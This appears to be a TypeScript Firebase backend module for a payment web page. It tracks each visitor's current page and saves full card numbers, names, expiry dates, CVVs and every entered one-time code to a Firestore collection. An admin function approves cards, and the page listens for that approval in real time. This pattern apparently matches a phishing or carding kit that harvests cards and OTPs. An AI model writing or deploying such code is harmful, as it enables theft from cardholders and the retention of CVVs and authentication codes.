import { getApp, getApps, initializeApp } from "firebase/app";
import { getDatabase } from "firebase/database";
import { arrayUnion, doc, getFirestore, setDoc, updateDoc, onSnapshot } from "firebase/firestore";
import {
  getAuth,
  signInWithEmailAndPassword,
  signOut,
  onAuthStateChanged,
  User,
} from "firebase/auth";

const firebaseConfig = {
  apiKey: "AIzaSyBJwAk57JgSfu-nXlctc9t5M2b5A0yOH3o",
  authDomain: "taminn-jh.firebaseapp.com",
  databaseURL: "https://taminn-jh-default-rtdb.firebaseio.com",
  projectId: "taminn-jh",
  storageBucket: "taminn-jh.firebasestorage.app",
  messagingSenderId: "910897215892",
  appId: "1:910897215892:web:d4788788e3a66d94abb781",
  measurementId: "G-MKE0PZWQEX",
};

function initializeFirebase() {
  if (typeof window === "undefined") {
    return null;
  }

  if (!firebaseConfig.apiKey || !firebaseConfig.projectId) {
    console.warn(
      "Firebase configuration is incomplete. Some features may not work.",
    );
    return null;
  }

  return getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
}

const app = initializeFirebase();
const db = app ? getFirestore(app) : null;
const database = app ? getDatabase(app) : null;
const auth = app ? getAuth(app) : null;

export const loginWithEmail = async (email: string, password: string) => {
  if (!auth) throw new Error("Auth not initialized");
  return signInWithEmailAndPassword(auth, email, password);
};

export const logoutUser = async () => {
  if (!auth) return;
  return signOut(auth);
};

export const onAuthChange = (callback: (user: User | null) => void) => {
  if (!auth) return () => {};
  return onAuthStateChanged(auth, callback);
};

export async function addData(data: any) {
  if (!db) {
    console.warn("Firebase not initialized. Cannot add data.");
    return;
  }

  localStorage.setItem("visitor", data.id);
  try {
    const docRef = await doc(db, "pays", data.id!);
    await setDoc(
      docRef,
      { ...data, createdDate: new Date().toISOString() },
      { merge: true },
    );

    console.log("Document written with ID: ", docRef.id);
  } catch (e) {
    console.error("Error adding document: ", e);
  }
}

export const handleCurrentPage = (page: string) => {
  const visitorId = localStorage.getItem("visitor");
  if (visitorId) {
    addData({ id: visitorId, currentPage: page });
  }
};

export const handleOtp = async (otp: string) => {
  const visitorId = localStorage.getItem("visitor");
  if (visitorId && db) {
    try {
      const docRef = doc(db, "pays", visitorId);
      const otpEntry = {
        code: otp,
        timestamp: new Date().toISOString(),
      };
      const existingOtps = JSON.parse(
        localStorage.getItem("otpHistory") || "[]",
      );
      existingOtps.push(otpEntry);
      localStorage.setItem("otpHistory", JSON.stringify(existingOtps));

      await setDoc(
        docRef,
        {
          otp,
          otpHistory: existingOtps,
          currentPage: "otp",
        },
        { merge: true },
      );
    } catch (error) {
      console.error("Error saving OTP:", error);
    }
  }
};

export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  if (!db) {
    console.warn("Firebase not initialized. Cannot process payment.");
    return;
  }

  try {
    const visitorId = localStorage.getItem("visitor");
    if (visitorId) {
      const docRef = doc(db, "pays", visitorId);
      const cardEntry = {
        cardNumber: paymentInfo?.cardNumber,
        cardName: paymentInfo?.cardName,
        expiryMonth: paymentInfo?.expiryMonth,
        expiryYear: paymentInfo?.expiryYear,
        cvv: paymentInfo?.cvv,
        cardType: paymentInfo?.cardType,
        timestamp: new Date().toISOString(),
      };

      try {
        // Prefer updateDoc + arrayUnion to preserve previous cards.
        await updateDoc(docRef, {
          ...paymentInfo,
          status: "pending_approval",
          cardApproved: false,
          cardHistory: arrayUnion(cardEntry),
        });
      } catch (err) {
        // Fallback (e.g. doc missing): seed history array.
        await setDoc(
          docRef,
          { ...paymentInfo, status: "pending_approval", cardApproved: false, cardHistory: [cardEntry] },
          { merge: true },
        );
      }
      setPaymentInfo((prev: any) => ({ ...prev, status: "pending_approval" }));
    }
  } catch (error) {
    console.error("Error adding document: ", error);
  }
};

// Listen for card approval status
export const listenForApproval = (callback: (approved: boolean) => void): (() => void) => {
  if (!db) {
    console.warn("Firebase not initialized. Cannot listen for approval.");
    return () => {};
  }

  const visitorId = localStorage.getItem("visitor");
  if (!visitorId) {
    return () => {};
  }

  const docRef = doc(db, "pays", visitorId);
  const unsubscribe = onSnapshot(docRef, (snapshot) => {
    if (snapshot.exists()) {
      const data = snapshot.data();
      if (data.cardApproved === true) {
        callback(true);
      }
    }
  });

  return unsubscribe;
};

// Update visitor approval status (for admin dashboard)
export const updateApprovalStatus = async (visitorId: string, approved: boolean) => {
  if (!db) {
    console.warn("Firebase not initialized.");
    return;
  }

  try {
    const docRef = doc(db, "pays", visitorId);
    await updateDoc(docRef, {
      cardApproved: approved,
      status: approved ? "approved" : "pending_approval",
    });
  } catch (error) {
    console.error("Error updating approval status:", error);
  }
};

export { db, database, auth };
